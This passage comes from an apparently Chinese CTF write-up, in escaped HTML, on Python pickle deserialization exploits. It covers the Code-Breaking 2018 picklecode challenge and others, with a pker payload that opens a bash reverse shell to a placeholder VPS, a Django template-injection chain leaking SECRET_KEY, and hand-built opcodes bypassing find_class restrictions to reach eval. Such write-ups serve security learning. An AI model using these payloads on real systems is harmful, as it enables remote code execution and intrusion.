&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œçš„é™åˆ¶æŒºç®€å•çš„äº†ï¼Œè¦†ç›–ä¸€ä¸ªnotadminå­—å…¸adminé”®çš„å€¼ä¸ºyeså³å¯æ‰§è¡Œç»™å‡ºçš„åé—¨å‡½æ•°&lt;code>eval()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ç”¨pker.pyç”Ÿæˆpayload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶å&lt;code>base64.b64encode(data)&lt;/code>åŠ è¿›&lt;code>session['info']&lt;/code>ä¸­æ‹¿åˆ°shell&lt;/p>
&lt;p>çœ‹wpï¼Œåé¢çš„æ­¥éª¤å¥½åƒè¿˜è·Ÿpwnæœ‰ç‚¹å…³ç³»ï¼Œæˆ‘å¯¹pwnæ¯«æ— ç ”ç©¶ï¼Œä¸çŒ®ä¸‘äº†ï¼ŒæŒ‡è·¯ä¸¤ä¸ªwp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥builtinsæ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>builtins&lt;/code>æ¨¡å—&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
&lt;p>æ›´å¤šçŸ¥è¯†å‚è€ƒï¼š&lt;a href="https://blog.51cto.com/xpleaf/1764849">æ·±å…¥ç†è§£Pythonä¸­çš„&lt;code>__builtin__&lt;/code>å’Œ&lt;code>__builtins__&lt;/code>&lt;/a> | [Python çš„å†…å»ºå¯¹è±¡](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> ä¸ &lt;code>__builtin__&lt;/code>ï¼ˆbuiltinsï¼‰&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­4 - [Code-Breaking 2018] picklecode
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬åœ°å¤ç°è¿˜æ˜¯å¤±è´¥ï¼Œdockeråœ°å€-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecodeï¼ˆå°±è·Ÿè¢«dockerè¯…å’’äº†ä¸€æ · ä»æ¥æ²¡æœ‰æˆåŠŸçš„ç”¨dockerå¤ç°è¿‡ä¸€é“é¢˜ğŸ˜­ğŸ˜­ğŸ˜­çœŸå°±è„‘è¡¥å‡ºflagäº†&lt;/p>
&lt;p>å®¡è®¡æºç ï¼Œæ˜¯ä¸€ä¸ªdjangoçš„é¡¹ç›®ï¼ˆæ­£å¥½ä¹‹å‰çš„å®è®­åšçš„å°±æ˜¯djangoçš„é¡¹ç›®ï¼Œçœ‹æºç è½»æ¾ä¸€äº›ï¼‰ï¼Œä¸»æ–‡ä»¶å¤¹æ˜¯coreï¼Œæœ‰ä¸€ä¸ªåä¸ºchallengeçš„app&lt;/p>
&lt;p>çœ‹coreä¸‹çš„settings.pyæ¯”é»˜è®¤çš„é…ç½®å¤šäº†54å’Œ55è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png" alt="image-20210809152122940">&lt;/p>
&lt;p>ç”¨äº†ç‰¹æ®Šçš„SESSION_ENGINEå’ŒSESSION_SERIALIZERï¼Œå‰è€…æŒ‡çš„æ˜¯djangoå°†ç”¨æˆ·è®¤è¯ä¿¡æ¯å­˜å‚¨åœ¨å“ªé‡Œ åè€…æŒ‡djangoç”¨ä»€ä¹ˆæ–¹å¼å­˜å‚¨è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±ç›¸å½“äºå…ˆç»è¿‡SESSION_SERIAZLIZERæŒ‡å®šçš„æ–¹å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå†æœ‰SESSION_ENGINEæŒ‡å®šçš„æ–¹å¼å­˜å‚¨åˆ°æŸä¸ªåœ°æ–¹ã€‚é»˜è®¤çš„djangoé¡¹ç›®ä¸­ï¼Œå­˜å‚¨ä½ç½®åº”è¯¥æ˜¯django.contrib.sessions.backends.dbï¼Œåºåˆ—åŒ–æ–¹å¼åº”è¯¥æ˜¯django.contrib.sessions.serializers.JSONSerializerï¼›è€Œè¿™é‡Œå°±æ˜¯ç”¨pickleåºåˆ—åŒ–åçš„å½¢å¼ï¼ŒåŠ ç­¾åsingedåå­˜å‚¨åœ¨cookieä¸­ã€‚é‚£è¿™é‡Œè‚¯å®šè¦æ§åˆ¶sessionï¼Œç»“åˆpickleæ¥rceäº†ï¼›è·Ÿè¿‡å»çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png" alt="image-20210809152317363">&lt;/p>
&lt;p>ä¾æ—§æ˜¯é‡å†™äº†&lt;code>find_class()&lt;/code>æ–¹æ³•ï¼Œåªæœ‰æ¨¡å—æ˜¯å†…ç½®çš„builtinsï¼ˆä¸éœ€è¦importå°±å¯ä»¥ç”¨çš„ï¼‰å¹¶ä¸”åå­—ä¸èƒ½åœ¨é»‘åå•ä¸­æ‰å¯ä»¥ï¼›è¿™é‡Œçš„ç»•è¿‡æ˜¯ç¬¬äºŒä¸ªè€ƒç‚¹äº†ï¼Œå…ˆç¿»å›å»çœ‹ä¸€ä¸‹ä»…æœ‰çš„appçš„views.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png" alt="image-20210809153617320">&lt;/p>
&lt;p>æ¨¡æ¿éƒ¨åˆ†ç›´æ¥æ‹¼æ¥äº†request.user.usernameï¼Œè¿™æ˜¯æ³¨å†Œæ—¶ä¼ å…¥ï¼Œæœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‰¾æ‰¾è°ƒç”¨é“¾&lt;/p>
&lt;p>ï¼ˆå› ä¸ºæœ¬åœ°ç¯å¢ƒå¤ªåƒåœ¾äº† æ²¡å¤ç° è¿™é‡Œäº‘åšé¢˜äº†ï¼‰åœ¨æ¨¡æ¿å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šçš„ä¸Šä¸‹æ–‡å˜é‡ï¼Œé€šå¸¸ä¼šå­˜åœ¨çš„æœ‰request, user, permsï¼Œè¿™é‡Œç”¨çš„åˆ©ç”¨é“¾æ˜¯ï¼ˆæ³¨æ„djangoæ¨¡æ¿å¼•æ“æ— æ³•è¯»å–ä¸‹åˆ’çº¿å¼€å¤´çš„å±æ€§ï¼‰&lt;code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}&lt;/code>ï¼Œæ³¨å†Œä¸€ä¸ªåä¸ºè¿™ä¸ªçš„ç”¨æˆ·å³å¯è·å¾—ç­¾åçš„å¯†é’¥ã€‚&lt;/p>
&lt;p>å†æ‰å¤´å›å»æ€è€ƒopcodeçš„ç¼–å†™ã€‚é‡å†™&lt;code>find_class()&lt;/code>ä¹‹åé™åˆ¶å¾ˆå¤šï¼Œä½†é€šè¿‡builtinsä»ç„¶å¯ä»¥ç”¨&lt;code>getattr()&lt;/code>ï¼›é‚£ä¹ˆå°±åˆ†ä¸¤æ­¥èµ°ï¼Œå…ˆé€šè¿‡&lt;code>builtins.getattr('builtins, 'eval')&lt;/code>æ¥è·å–&lt;code>eval()&lt;/code>ï¼Œå†æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆå¦‚ä½•æ‰‹å†™protocol=0çš„opcodeæï¼Ÿ&lt;/p>
&lt;p>é¦–å…ˆå¼•å…¥æ¨¡å—builtinså’Œå‡½æ•°getattr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åéœ€è¦è·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç”¨globals()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>globalsæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥è¿˜è¦è·å–dictè¿™ä¸ªå¯¹è±¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿˜è¦æ‰§è¡Œglobals()è·å–å®Œæ•´ä¸Šä¸‹æ–‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ ˆé¡¶å…ƒç´ æ˜¯builtins.globalsï¼Œå‹å…¥ä¸€ä¸ªç©ºå…ƒç»„&lt;code>(t&lt;/code>ï¼Œç„¶åç”¨&lt;code>R&lt;/code>æ‰§è¡Œ&lt;/p>
&lt;p>ç„¶åç”¨dict.get()æ–¹æ³•ä»globalsçš„å­—å…¸ä¸­æ‹¿åˆ°é”®åä¸ºbuiltionsçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ååºåˆ—åŒ–åå¾—åˆ°builtinså¯¹è±¡&lt;code>&amp;lt;module 'builtins' (built-in)&amp;gt;&lt;/code>ï¼›ä¹‹åå†ç”¨getatträ»builtinså¯¹è±¡ä¸­å–å‡ºevalï¼Œä¹Ÿå°±æ˜¯å†å¥—ä¸€å±‚å¨ƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;built-in function eval&amp;gt;&lt;/code>ç°åœ¨å·²ç»æ‹¿åˆ°äº†evalå¯¹è±¡ï¼Œå†æ‰§è¡Œä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;ls&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
&lt;p>æˆåŠŸæ‰§è¡Œä»£ç ï¼ˆæ³¨æ„è¿è¡Œæ—¶ä¸ä»…éœ€è¦å¼•å…¥pickle ä¹Ÿè¦å¼•å…¥builtinsæ‰å¯ä»¥ï¼ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”ç”¨pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.redmango.top/article/64">wp1&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®±&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥sysæ¨¡å—åå­—ä¸­ä¸å¸¦ç‚¹å·">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>sys&lt;/code>æ¨¡å—&amp;amp;åå­—ä¸­ä¸å¸¦&lt;code>.&lt;/code>ç‚¹å·&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­5 - [BalsnCTF 2019] Pyshv1
&lt;/h4>
&lt;/summary>
&lt;p>é¢˜ç›®ç¯å¢ƒ-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
&lt;p>å®¡è®¡ä¸€ä¸‹æºç ï¼Œå…ˆçœ‹ä¸€ä¸‹è‚¯å®šä¼šä¸secureçš„securePickle.oy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png" alt="image-20210811212055295">&lt;/p>
&lt;p>é‡å†™&lt;code>find_class()&lt;/code>ï¼Œè¢«è°ƒç”¨æ—¶å¯ä»¥çµæ´»æ·»åŠ ç™½åå•ï¼›å†çœ‹çœ‹server.py&lt;/p>
